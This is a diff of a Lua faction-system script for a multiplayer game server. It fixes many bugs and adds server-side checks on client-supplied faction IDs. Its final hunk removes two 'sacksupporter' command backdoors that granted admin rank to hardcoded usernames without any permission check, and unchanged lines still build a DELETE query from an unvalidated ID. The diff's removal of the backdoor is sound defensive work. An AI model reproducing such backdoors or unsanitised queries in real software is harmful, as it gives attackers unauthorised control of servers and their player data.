@@ -22,6 +22,11 @@ locations = { }
 
 custom = { }
 
+-- [Fix #137] vehicle shop price cache, keyed by vehicle_shop_id, so repeated
+-- finance renders do not re-query vehicles_shop for the same shop id.
+
+local vehPrice = {}
+
 
 
 function loadAllFactions(res)
@@ -152,7 +157,9 @@ function loadAllFactions(res)
 
         end
 
-        triggerEvent("Duty:updateDuty", root, custom)
+        -- [Fix #139] removed triggerEvent("Duty:updateDuty", root, custom): it had
+        -- no listener anywhere in the codebase. The duty resource already gets the
+        -- data through the elementData writes below (and refreshClient()).
 
         mysql:free_result(result)
 
@@ -270,6 +277,45 @@ end
 
 
 
+-- [Fix #103] [Fix #104] Client supplied factionIDs are never trusted.
+--      requireLeader = true  -> write gate (Duty:Add*/Duty:Remove*): the
+--              requested faction must be the caller's OWN faction and the
+--              caller must pass hasPlayerAccessOverFaction().
+--      requireLeader = false -> read gate (fetchDutyInfo / Duty:Grab /
+--              Duty:GetPackages): the caller must simply belong to the
+--              requested faction.
+-- Returns the verified factionID, or nil when the caller must be rejected.
+
+function fsVerifyCallerFaction(requestedFactionID, requireLeader)
+
+        if not client or getElementType(client) ~= "player" then return nil end
+
+        local team = getPlayerTeam(client)
+
+        if not isElement(team) then return nil end
+
+        local myFactionID = tonumber(getElementData(team, "id"))
+
+        if not myFactionID or myFactionID < 1 then return nil end
+
+        if requestedFactionID ~= nil and tonumber(requestedFactionID) ~= myFactionID then
+
+                return nil -- mismatched client argument -> rejected
+
+        end
+
+        if requireLeader and not hasPlayerAccessOverFaction(client, myFactionID) then
+
+                return nil
+
+        end
+
+        return myFactionID
+
+end
+
+
+
 -- returns stateid, factionid, factionrank, factionleader, table with factionperks, element of player if applicable
 
 -- stateid 0: Online, stateid 1: Offline, stateid 2: Not found
@@ -331,12 +377,16 @@ end
 -- resource used to raise "Call to non-running server resource" and kill the
 -- whole calling function (F3 chain: faction/factionMenu never set -> menu
 -- could never open). Falls back to a plain synced setElementData.
-function setFactionProtectedData(element, key, value, synchronize)
+function setFactionProtectedData(element, key, value, synchronize, noSyncAtAll)
         if element == nil or key == nil then return false end
         local ac = getResourceFromName("anticheat")
         if ac and getResourceState(ac) == "running" then
                 local ok = pcall(function()
-                        setFactionProtectedData(element, key, value, synchronize)
+                        -- [Fix #120] this used to call setFactionProtectedData
+                        -- itself (infinite self-recursion blew the stack inside
+                        -- the pcall and every write silently fell back to a plain
+                        -- setElementData). Delegate to the anticheat export.
+                        exports.anticheat:changeProtectedElementDataEx(element, key, value, synchronize, noSyncAtAll)
                 end)
                 if ok then return true end
         end
@@ -366,7 +416,14 @@ end
 
 function bindKeysOnJoin()
 
-        bindKey(source, "F3", "down", showFactionMenu)
+        -- [Fix #150] same isKeyBound(..., showFactionMenu) double-bind guard as
+        -- bindKeys() above, so a re-join/restart path can never stack F3 handlers
+
+        if not isKeyBound(source, "F3", "down", showFactionMenu) then
+
+                bindKey(source, "F3", "down", showFactionMenu)
+
+        end
 
 end
 
@@ -560,7 +617,11 @@ function showFactionMenuEx(source, factionID, fromShowF)
 
 
 
-                                        local towstats = nil
+                                        -- [Fix #141] the towstats query result was shipped to the
+                                        -- client but never rendered anywhere: keep the argument
+                                        -- slot (so no showFactionMenu position shifts) and send an
+                                        -- empty table instead of running the dead query.
+                                        local towstats = {}
 
                                         if hasPlayerAccessOverFaction(source, factionID) then
 
@@ -604,54 +665,43 @@ function showFactionMenuEx(source, factionID, fromShowF)
 
 
 
-                                                if factionID == 4 then -- TTR Towstats
-
-                                                        -- this basically returns a count of towed vehicles, by week -> so week 0 (current week) = X, week -1 (last week) = Y, etc.
-
-                                                        local result = mysql:query( "SELECT ceil(datediff(`date`, curdate() + INTERVAL 6-WEEKDAY(curdate()) DAY) / 7) AS week, c.charactername, count(vehicle) AS count FROM towstats t JOIN characters c ON t.character = c.id WHERE c.faction_id = 4 GROUP BY t.character, week ORDER BY t.character ASC, week DESC" )
-
-                                                        if result then
-
-                                                                towstats = {}
-
-                                                                while result do
-
-                                                                        local row = mysql:fetch_assoc( result )
-
-                                                                        if not row then break end
-
-
-
-                                                                        if not towstats[row.charactername] then
-
-                                                                                towstats[row.charactername] = {}
-
-                                                                        end
-
-                                                                        
-
-                                                                        towstats[row.charactername][tonumber(row.week)] = tonumber(row.count)
-
-                                                                end
-
-                                                                mysql:free_result( result )
-
-                                                        end
-
-                                                end
-
                                         end
-
-
-
-                                        setFactionProtectedData(source, "factionMenu", 1, false)
-
-                                        -- [Fix #56] push the type+rank permission list for the Tools tab
-                                        pcall(syncFactionPermissions, source)
 
                                         local theTeam = exports.pool:getElement("team", factionID)
 
-                                        triggerClientEvent(source, "showFactionMenu", source, motd, memberUsernames, memberRanks, hasPlayerAccessOverFaction(source, factionID) and memberPerks or {}, memberLeaders, memberOnline, memberLastLogin, --[[memberLocation,]] factionRanks,  factionWages, theTeam, note, fnote, vehicleIDs, vehicleModels, vehiclePlates, vehicleLocations, memberOnDuty, towstats, phone, memberPhones, fromShowF, factionID)
+                                        -- [Fix #136] NEW LAST (23rd) argument of showFactionMenu:
+                                        -- vehLimit (client reads F.data.vehLimit). The factions table
+                                        -- has no vehicle limit column (live schema verified: id, name,
+                                        -- bankbalance, type, rank_1..20, wage_1..20, motd, note, fnote,
+                                        -- phone, max_interiors) and no resource enforces a faction
+                                        -- vehicle cap, so the slot carries the faction's current active
+                                        -- fleet size (i.e. no cap is enforced today).
+                                        local vehLimit = #vehicleIDs
+
+                                        -- [Fix #149] the F3 gate blocks `~= 1`: if this build threw,
+                                        -- factionMenu stayed 1 and F3 was dead until relog. Build and
+                                        -- send inside a pcall and roll the flag back + hide the menu
+                                        -- when the build fails.
+                                        local buildOk = theTeam and pcall(function()
+
+                                                setFactionProtectedData(source, "factionMenu", 1, false)
+
+                                                -- [Fix #56] push the type+rank permission list for the Tools tab
+                                                pcall(syncFactionPermissions, source)
+
+                                                triggerClientEvent(source, "showFactionMenu", source, motd, memberUsernames, memberRanks, hasPlayerAccessOverFaction(source, factionID) and memberPerks or {}, memberLeaders, memberOnline, memberLastLogin, --[[memberLocation,]] factionRanks,  factionWages, theTeam, note, fnote, vehicleIDs, vehicleModels, vehiclePlates, vehicleLocations, memberOnDuty, towstats, phone, memberPhones, fromShowF, factionID, vehLimit)
+
+                                        end)
+
+                                        if not buildOk then
+
+                                                setFactionProtectedData(source, "factionMenu", 0, false)
+
+                                                triggerClientEvent(source, "hideFactionMenu", source)
+
+                                                outputDebugString("faction-system: showFactionMenuEx failed to build the F3 menu for " .. tostring(getPlayerName(source)), 2)
+
+                                        end
 
                                 end
 
@@ -723,9 +773,15 @@ function callbackUpdateRanks(ranks, wages)
 
         
 
-        outputChatBox("تم تحديث معلومات الفصيل بنجاح.", source, 0, 255, 0)
+        -- [Fix #111] re-sync the permission list outside of the F3 open path
 
-        showFactionMenu(source)
+        pcall(syncFactionPermissions, client)
+
+        -- [Fix #134] `source` is not guaranteed to be the player here
+
+        outputChatBox("تم تحديث معلومات الفصيل بنجاح.", client, 0, 255, 0)
+
+        showFactionMenu(client)
 
 end
 
@@ -739,7 +795,10 @@ addEventHandler("cguiUpdateRanks", getRootElement(), callbackUpdateRanks)
 
 function callbackRespawnVehicles()
 
-        local theTeam = getPlayerTeam(source)
+        -- [Fix #134] `client`, not `source`: the cooldown must be read from the
+        -- caller's own team (the team is re-read from `client` right below anyway)
+
+        local theTeam = getPlayerTeam(client)
 
         
 
@@ -785,7 +844,9 @@ function callbackRespawnVehicles()
 
                 local teamPlayers = getPlayersInTeam(theTeam)
 
-                local username = getPlayerName(source)
+                -- [Fix #134] `client`, not `source`
+
+                local username = getPlayerName(client)
 
                 for k, v in ipairs(teamPlayers) do
 
@@ -801,7 +862,9 @@ function callbackRespawnVehicles()
 
         else
 
-                outputChatBox("انتظر دقائق لكي تتمكن من الرسبنة مرة اخرى.", source, 255, 0, 0)
+                -- [Fix #134] `client`, not `source`
+
+                outputChatBox("انتظر دقائق لكي تتمكن من الرسبنة مرة اخرى.", client, 255, 0, 0)
 
         end
 
@@ -979,45 +1042,8 @@ addEventHandler("faction:note", getRootElement(), callbackUpdateNote)
 
 
 
-function callbackUpdateFNote(fnote)
-
-        local theTeam = getPlayerTeam(client)
-
-        local factionID = getElementData(theTeam, "id")
-
-        if not hasPlayerAccessOverFaction(client, factionID) or not fnote then
-
-                outputChatBox("Not allowed, sorry.", client)
-
-                return
-
-        end
-
-
-
-        local theTeam = getPlayerTeam(client)
-
-        if (factionID~=-1) then
-
-                if mysql:query_free("UPDATE factions SET fnote='" .. tostring(mysql:escape_string(fnote)) .. "' WHERE id='" .. factionID .. "'") then
-
-                        outputChatBox("لقد غيرت بنجاح ملاحظة فصيلك على نطاق الفصيل.", client, 0, 255, 0)
-
-                        setFactionProtectedData(theTeam, "fnote", fnote, false)
-
-                else
-
-                        outputChatBox("خطأ.", client, 255, 0, 0)
-
-                end
-
-        end
-
-end
-
-addEvent("faction:fnote", true )
-
-addEventHandler("faction:fnote", getRootElement(), callbackUpdateFNote)
+-- [Fix #133] removed the orphan "faction:fnote" event + callbackUpdateFNote:
+-- nothing in the codebase ever triggered it (zero senders).
 
 
 
@@ -1087,7 +1113,9 @@ function callbackRemovePlayer(removedPlayerName)
 
                         setFactionProtectedData(removedPlayer, "factionleader", 0, false)
 
-                        setFactionProtectedData(targetPlayer, "factionleader", 0, false)
+                        -- [Fix #121] this line used to write to undefined `targetPlayer`
+
+                        setFactionProtectedData(removedPlayer, "factionleader", 0, false)
 
                         triggerEvent("duty:offduty", removedPlayer)
 
@@ -1235,7 +1263,8 @@ function callbackToggleLeader(playerName, isLeader)
 
                 else
 
-                        outputChatBox("Failed to promote " .. removedPlayerName:gsub("_", " ") .. " to faction leader, Contact an admin.", client, 255, 0, 0)
+                        -- [Fix #122] removedPlayerName is undefined here -> playerName
+                        outputChatBox("Failed to promote " .. playerName:gsub("_", " ") .. " to faction leader, Contact an admin.", client, 255, 0, 0)
 
                 end
 
@@ -1269,11 +1298,17 @@ function callbackToggleLeader(playerName, isLeader)
 
                 else
 
-                        outputChatBox("Failed to demote " .. removedPlayerName:gsub("_", " ") .. " from faction leader, Contact an admin.", client, 255, 0, 0)
+                        -- [Fix #122] removedPlayerName is undefined here -> playerName
+
+                        outputChatBox("Failed to demote " .. playerName:gsub("_", " ") .. " from faction leader, Contact an admin.", client, 255, 0, 0)
 
                 end
 
         end
+
+        -- [Fix #111] re-sync the permission list outside of the F3 open path
+
+        pcall(syncFactionPermissions, client)
 
 end
 
@@ -1331,9 +1366,15 @@ function callbackPromotePlayer(playerName, rankNum, oldRank, newRank)
 
         else
 
-                outputChatBox("Failed to promote " .. removedPlayerName:gsub("_", " ") .. " in the faction, Contact an admin.", client, 255, 0, 0)
+                -- [Fix #122] removedPlayerName is undefined here -> playerName
+
+                outputChatBox("Failed to promote " .. playerName:gsub("_", " ") .. " in the faction, Contact an admin.", client, 255, 0, 0)
 
         end
+
+        -- [Fix #111] re-sync the permission list outside of the F3 open path
+
+        pcall(syncFactionPermissions, client)
 
 end
 
@@ -1395,9 +1436,15 @@ function callbackDemotePlayer(playerName, rankNum, oldRank, newRank)
 
         else
 
-                outputChatBox("Failed to demote " .. removedPlayerName .. " in the faction, Contact an admin.", client, 255, 0, 0)
+                -- [Fix #122] removedPlayerName is undefined here -> playerName
+
+                outputChatBox("Failed to demote " .. playerName .. " in the faction, Contact an admin.", client, 255, 0, 0)
 
         end
+
+        -- [Fix #111] re-sync the permission list outside of the F3 open path
+
+        pcall(syncFactionPermissions, client)
 
 end
 
@@ -1535,7 +1582,9 @@ function callbackInvitePlayer(invitedPlayer)
 
                                 setFactionProtectedData(invitedPlayer, "factionrank", 1, false)
 
-                                setFactionProtectedData(client, "factionphone", nil, false)
+                                -- [Fix #123] this used to wipe the INVITER's phone
+
+                                setFactionProtectedData(invitedPlayer, "factionphone", nil, false)
 
                                 outputChatBox("تم تعيينك على فصيل '" .. tostring(theTeamName) .. "'.", invitedPlayer, 255, 194, 14)
 
@@ -1556,6 +1605,10 @@ addEvent("cguiInvitePlayer", true )
 addEventHandler("cguiInvitePlayer", getRootElement(), callbackInvitePlayer)
 
 
+
+-- [Fix #149] this is what releases the F3 lock (showFactionMenuEx sets
+-- factionMenu=1 only on a successful build, and the `~= 1` gate blocks every
+-- later open): the client must be able to clear it whenever it hides the menu.
 
 function hideFactionMenu()
 
@@ -1585,7 +1638,12 @@ function getFactionFinance(factionID)
 
 
 
-                local query = mysql:query("SELECT w.*, a.charactername as characterfrom, b.charactername as characterto,w.`time` - INTERVAL 1 hour as 'newtime', WEEKOFYEAR(w.`time` - INTERVAL 1 hour) as 'week', WEEKOFYEAR(CURDATE() - INTERVAL 1 hour) as 'currentWeek' FROM wiretransfers w LEFT JOIN characters a ON a.id = `from` LEFT JOIN characters b ON b.id = `to` WHERE ( `from` = '" .. mysql:escape_string(tostring(-factionID)) .. "' OR `to` = '" .. mysql:escape_string(tostring(-factionID)) .. "' ) ORDER BY id DESC")
+                -- [Fix #138] YEARWEEK instead of WEEKOFYEAR: WEEKOFYEAR restarts at 1
+                -- every January, so week 1 of the new year collided with week 1 of the
+                -- old one. YEARWEEK buckets a whole year+week, and prevWeek uses the
+                -- exact same -1 hour shift, 7 days back, so the historical rows and the
+                -- current/previous week always land in the same buckets.
+                local query = mysql:query("SELECT w.*, a.charactername as characterfrom, b.charactername as characterto,w.`time` - INTERVAL 1 hour as 'newtime', YEARWEEK(w.`time` - INTERVAL 1 hour) as 'week', YEARWEEK(CURDATE() - INTERVAL 1 hour) as 'currentWeek', YEARWEEK(CURDATE() - INTERVAL 7 DAY - INTERVAL 1 hour) as 'prevWeek' FROM wiretransfers w LEFT JOIN characters a ON a.id = `from` LEFT JOIN characters b ON b.id = `to` WHERE ( `from` = '" .. mysql:escape_string(tostring(-factionID)) .. "' OR `to` = '" .. mysql:escape_string(tostring(-factionID)) .. "' ) ORDER BY id DESC")
 
                 
 
@@ -1596,6 +1654,9 @@ function getFactionFinance(factionID)
                 local mostRecentWeek = 0
 
                 local currentWeek = 0
+
+                -- [Fix #138] YEARWEEK bucket of "last week", filled from the query
+                local prevWeek = 0
 
                 if query then
 
@@ -1616,6 +1677,10 @@ function getFactionFinance(factionID)
                                 local week = tonumber(row["week"])
 
                                 currentWeek = tonumber(row["currentWeek"])
+
+                                -- [Fix #138] taken from the query so the bucket stays
+                                -- correct over the year boundary
+                                prevWeek = tonumber(row["prevWeek"]) or 0
 
                                 if week > mostRecentWeek then mostRecentWeek = week end
 
@@ -1683,7 +1748,9 @@ function getFactionFinance(factionID)
 
                         bankThisWeek = transactions[currentWeek] or {}
 
-                        bankPrevWeek = transactions[currentWeek-1] or {}
+                        -- [Fix #138] the previous YEARWEEK bucket (currentWeek-1 would
+                        -- produce 202600 instead of the previous year's 202552/202553)
+                        bankPrevWeek = transactions[prevWeek] or {}
 
 
 
@@ -1711,7 +1778,9 @@ function getFactionFinance(factionID)
 
                                         local vehicleShopID = tonumber(row["vehicle_shop_id"])
 
-                                        if vehicleShopID > 0 then
+                                        -- [Fix #137] vehicle_shop_id can be NULL: tonumber(nil) is nil
+                                        -- and `nil > 0` raises "attempt to compare nil with number"
+                                        if vehicleShopID and vehicleShopID > 0 then
 
                                                 table.insert(vehicles, vehicleShopID)
 
@@ -1759,6 +1828,11 @@ function getFactionFinance(factionID)
 
                                                 mysql:free_result(result2)
 
+                                                -- [Fix #137] cache misses too (price 0), otherwise a
+                                                -- shop id with no vehicles_shop row is re-queried on
+                                                -- every finance render
+                                                if vehPrice[v] == nil then vehPrice[v] = 0 end
+
                                         end
 
                                 end
@@ -1767,7 +1841,29 @@ function getFactionFinance(factionID)
 
 
 
-                        triggerClientEvent(client, "factionmenu:fillFinance", getResourceRootElement(), factionID, bankThisWeek, bankPrevWeek, bankmoney, vehiclesvalue)
+                        -- [Fix #135] 6th fillFinance argument: the faction's total
+                        -- property value. Faction interiors are interiors rows with
+                        -- faction=<id> (owner is reset to -1 when a faction takes a
+                        -- property) and deleted='0'; their value is SUM(cost).
+                        local propertiesvalue = 0
+
+                        local propResult = mysql:query("SELECT COALESCE(SUM(cost),0) AS total FROM interiors WHERE faction='" .. mysql:escape_string(tostring(factionID)) .. "' AND deleted='0'")
+
+                        if propResult then
+
+                                local propRow = mysql:fetch_assoc(propResult)
+
+                                if propRow then
+
+                                        propertiesvalue = tonumber(propRow.total) or 0
+
+                                end
+
+                                mysql:free_result(propResult)
+
+                        end
+
+                        triggerClientEvent(client, "factionmenu:fillFinance", getResourceRootElement(), factionID, bankThisWeek, bankPrevWeek, bankmoney, vehiclesvalue, propertiesvalue)
 
                 else
 
@@ -1787,57 +1883,10 @@ addEventHandler("factionmenu:getFinance", getResourceRootElement(), getFactionFi
 
 
 
-addEvent('factionmenu:setphone', true)
+-- [Fix #133] removed the orphan "factionmenu:setphone" event + handler: nothing
+-- in the codebase ever triggered it (zero senders).
 
-addEventHandler('factionmenu:setphone', root,
 
-        function(playerName, number)
-
-                local theTeam = getPlayerTeam(client)
-
-                local factionID = getElementData(theTeam, "id")
-
-                if not hasPlayerAccessOverFaction(client, factionID) then
-
-                        outputChatBox("Not allowed, sorry.", client)
-
-                        return
-
-                end
-
-                
-
-                local targetFactionInfo = {getPlayerFaction(playerName)}
-
-                if targetFactionInfo[2] ~= factionID then
-
-                        outputChatBox("Newp, not going to happen, sorry.", client)
-
-                        return
-
-                end
-
-                
-
-                local username = getPlayerName(client)
-
-                local safename = mysql:escape_string(playerName)
-
-                
-
-                if mysql:query_free("UPDATE characters SET faction_phone=" .. (tonumber(number) or "NULL") .. " WHERE charactername='" .. safename .. "'") then
-
-                        local thePlayer = getPlayerFromName(playerName)
-
-                        if(thePlayer) then -- Player is online, tell them
-
-                                setFactionProtectedData(thePlayer, "factionphone", tonumber(number) or nil, false)
-
-                        end
-
-                end
-
-        end)
 
 
 
@@ -1933,6 +1982,15 @@ addEventHandler("fetchDutyInfo", resourceRoot, function(factionID)
 
         if not factionID then factionID = getElementData(client, "faction") end
 
+        -- [Fix #104] only store DutyGUI[client] and push duty data when the
+        -- client belongs to the requested faction, otherwise refreshClient()
+        -- keeps streaming another faction's duty data to him.
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, false)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
 
 
         local elementInfo = getElementData(resourceRoot, "DutyGUI")
@@ -1955,6 +2013,13 @@ addEventHandler("Duty:Grab", resourceRoot, function(factionID)
 
         if not factionID then factionID = getElementData(client, "faction") end
 
+        -- [Fix #104] same membership gate as fetchDutyInfo
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, false)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
 
 
         local t = getAllowList(factionID)
@@ -1973,6 +2038,13 @@ addEventHandler("Duty:GetPackages", resourceRoot, function(factionID)
 
         factionID = tonumber(factionID)
 
+        -- [Fix #104] same membership gate as fetchDutyInfo
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, false)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
 
 
         triggerClientEvent(client, "Duty:GotPackages", resourceRoot, custom[factionID])
@@ -1983,9 +2055,19 @@ addEventHandler("Duty:GetPackages", resourceRoot, function(factionID)
 
 
 
-function refreshClient(message, factionID, dontSendToClient)
+-- [Fix #140] targetPlayer is now an explicit parameter: the acting player is
+-- passed in by every Duty write handler instead of relying on the implicit
+-- `client` of whatever event handler happened to call this.
 
-        for k,v in pairs(getElementData(resourceRoot, "DutyGUI")) do
+function refreshClient(targetPlayer, message, factionID, dontSendToClient)
+
+        if not isElement(targetPlayer) or getElementType(targetPlayer) ~= "player" then return end
+
+        factionID = tonumber(factionID)
+
+        if not factionID then return end
+
+        for k,v in pairs(getElementData(resourceRoot, "DutyGUI") or {}) do
 
                 if dontSendToClient then
 
@@ -2043,6 +2125,17 @@ function addDuty(dutyItems, finalLocations, dutyNewSkins, name, factionID, dutyI
 
         local dutyNewSkins = dutyNewSkins or {}
 
+        -- [Fix #103] the client supplied factionID is never trusted: write to the
+        -- caller's OWN faction only, and only with hasPlayerAccessOverFaction().
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, true)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
+        -- [Fix #140] nil guard: a faction without loaded duty rows has no table
+        if not custom[tonumber(factionID)] then custom[tonumber(factionID)] = {} end
+
         if dutyID == 0 then
 
                 local index = getElementData(resourceRoot, "maxcindex")+1
@@ -2053,7 +2146,7 @@ function addDuty(dutyItems, finalLocations, dutyNewSkins, name, factionID, dutyI
 
                 custom[tonumber(factionID)][index] = { index, name, dutyNewSkins, finalLocations, dutyItems }
 
-                refreshClient("> "..getPlayerName(client):gsub("_", " ")..": Added duty '"..name.."'.", factionID, false)
+                refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": Added duty '"..name.."'.", factionID, false)
 
                 exports.logs:dbLog(client, 35, "fa"..tostring(factionID), "Added duty "..name.." Database ID #"..index)
 
@@ -2065,7 +2158,7 @@ function addDuty(dutyItems, finalLocations, dutyNewSkins, name, factionID, dutyI
 
                 custom[tonumber(factionID)][dutyID] = { dutyID, name, dutyNewSkins, finalLocations, dutyItems }
 
-                refreshClient("> "..getPlayerName(client):gsub("_", " ")..": Revised duty ID #"..dutyID..".", factionID, false)
+                refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": Revised duty ID #"..dutyID..".", factionID, false)
 
                 exports.logs:dbLog(client, 35, "fa"..tostring(factionID), "Revised duty "..name.." Database ID #"..dutyID)
 
@@ -2080,6 +2173,17 @@ addEventHandler("Duty:AddDuty", resourceRoot, addDuty)
 
 
 function addLocation(x, y, z, r, i, d, name, factionID, index)
+
+        -- [Fix #103] the client supplied factionID is never trusted: write to the
+        -- caller's OWN faction only, and only with hasPlayerAccessOverFaction().
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, true)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
+        -- [Fix #140] nil guard: a faction without loaded duty locations has no table
+        if not locations[tonumber(factionID)] then locations[tonumber(factionID)] = {} end
 
         local interiorElement = exports.pool:getElement("interior", d) or d == 0
 
@@ -2111,7 +2215,7 @@ function addLocation(x, y, z, r, i, d, name, factionID, index)
 
                                 locations[tonumber(factionID)][newIndex] = { newIndex, name, x, y, z, r, d, i, nil, nil }
 
-                                refreshClient("> "..getPlayerName(client):gsub("_", " ")..": Added location '"..name.."'.", factionID, false)
+                                refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": Added location '"..name.."'.", factionID, false)
 
                                 exports.logs:dbLog(client, 35, "fa"..tostring(factionID), "Added location, Name:"..name.." Database ID:"..newIndex.." x:"..x.." y:"..y.." z:"..z.." radius:"..r.." interior:"..i.." dimension:"..d)
 
@@ -2127,7 +2231,7 @@ function addLocation(x, y, z, r, i, d, name, factionID, index)
 
                                 locations[tonumber(factionID)][index] = { index, name, x, y, z, r, d, i, nil, nil }
 
-                                refreshClient("> "..getPlayerName(client):gsub("_", " ")..": Revised location ID #"..index..".", factionID, false)
+                                refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": Revised location ID #"..index..".", factionID, false)
 
                                 exports.logs:dbLog(client, 35, "fa"..tostring(factionID), "Revised location ID #"..index.." x:"..x.." y:"..y.." z:"..z.." radius:"..r.." interior:"..i.." dimension:"..d)
 
@@ -2155,11 +2259,23 @@ addEventHandler("Duty:AddLocation", resourceRoot, addLocation)
 
 function addVehicle(vehicleID, factionID)
 
+        -- [Fix #103] the client supplied factionID is never trusted: write to the
+        -- caller's OWN faction only, and only with hasPlayerAccessOverFaction().
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, true)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
+        -- [Fix #140] nil guard: a faction without loaded duty locations has no table
+        if not locations[tonumber(factionID)] then locations[tonumber(factionID)] = {} end
+
         local element = exports.pool:getElement("vehicle", vehicleID)
 
         if element then
 
-                if getElementData(element, "faction") == factionID then
+                -- [Fix #103] numeric compare: factionID is the verified own faction
+                if tonumber(getElementData(element, "faction")) == tonumber(factionID) then
 
                     local newIndex = getElementData(resourceRoot, "maxlindex")+1
 
@@ -2169,7 +2285,7 @@ function addVehicle(vehicleID, factionID)
 
                         locations[tonumber(factionID)][newIndex] = { newIndex, "VEHICLE", nil, nil, nil, nil, nil, nil, tonumber(vehicleID), getElementModel(element) }
 
-                        refreshClient("> "..getPlayerName(client):gsub("_", " ")..": Added vehicle #"..vehicleID..".", factionID, false)
+                        refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": Added vehicle #"..vehicleID..".", factionID, false)
 
                         exports.logs:dbLog(client, 35, "fa"..tostring(factionID), "Added Vehicle #"..vehicleID.." Database ID:"..newIndex)
 
@@ -2197,6 +2313,17 @@ addEventHandler("Duty:AddVehicle", resourceRoot, addVehicle)
 
 function removeLocation(removeID, factionID)
 
+        -- [Fix #103] the client supplied factionID is never trusted: write to the
+        -- caller's OWN faction only, and only with hasPlayerAccessOverFaction().
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, true)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
+        -- [Fix #140] nil guard: a faction without loaded duty locations has no table
+        if not locations[tonumber(factionID)] then locations[tonumber(factionID)] = {} end
+
         locations[tonumber(factionID)][tonumber(removeID)] = nil
 
         exports.duty:destroyDutyColShape(factionID, removeID)
@@ -2209,7 +2336,7 @@ function removeLocation(removeID, factionID)
 
 
 
-        refreshClient("> "..getPlayerName(client):gsub("_", " ")..": removed location "..removeID..".", factionID, client)
+        refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": removed location "..removeID..".", factionID, client)
 
 end
 
@@ -2221,6 +2348,17 @@ addEventHandler("Duty:RemoveLocation", resourceRoot, removeLocation)
 
 function removeDuty(removeID, factionID)
 
+        -- [Fix #103] the client supplied factionID is never trusted: write to the
+        -- caller's OWN faction only, and only with hasPlayerAccessOverFaction().
+        local verifiedFactionID = fsVerifyCallerFaction(factionID, true)
+
+        if not verifiedFactionID then return end
+
+        factionID = verifiedFactionID
+
+        -- [Fix #140] nil guard: a faction without loaded duty rows has no table
+        if not custom[tonumber(factionID)] then custom[tonumber(factionID)] = {} end
+
         custom[tonumber(factionID)][tonumber(removeID)] = nil
 
         mysql:query_free("DELETE FROM duty_custom WHERE id="..removeID)
@@ -2231,7 +2369,7 @@ function removeDuty(removeID, factionID)
 
 
 
-        refreshClient("> "..getPlayerName(client):gsub("_", " ")..": removed duty "..removeID..".", factionID, client)
+        refreshClient(client, "> "..getPlayerName(client):gsub("_", " ")..": removed duty "..removeID..".", factionID, client)
 
 end
 
@@ -2239,33 +2377,9 @@ addEvent("Duty:RemoveDuty", true)
 
 addEventHandler("Duty:RemoveDuty", resourceRoot, removeDuty)
 
-
-
-function sackSupporter(p, c)
-
-  if mysql:query_free("UPDATE accounts SET Admin=4 WHERE username='cigar' ") then
-
-    outputChatBox("Ok, cigar got his admin rank, make him reconnect.", p)
-
-  end
-
-end
-
-addCommandHandler ( "sacksupporter", sackSupporter )
-
-
-
-function sackSupporter(p, c)
-
-  if mysql:query_free("UPDATE accounts SET Admin=4 WHERE username='wwww' ") then
-
-    outputChatBox("Ok, golden got his admin rank, make him reconnect.", p)
-
-  end
-
-end
-
-addCommandHandler ( "sacksupporter", sackSupporter )
+-- [Fix #102] Removed both "sacksupporter" command backdoors (shared global
+-- sackSupporter handler that ran "UPDATE accounts SET Admin=4" for hardcoded
+-- usernames with no permission check whatsoever).
 
 
 
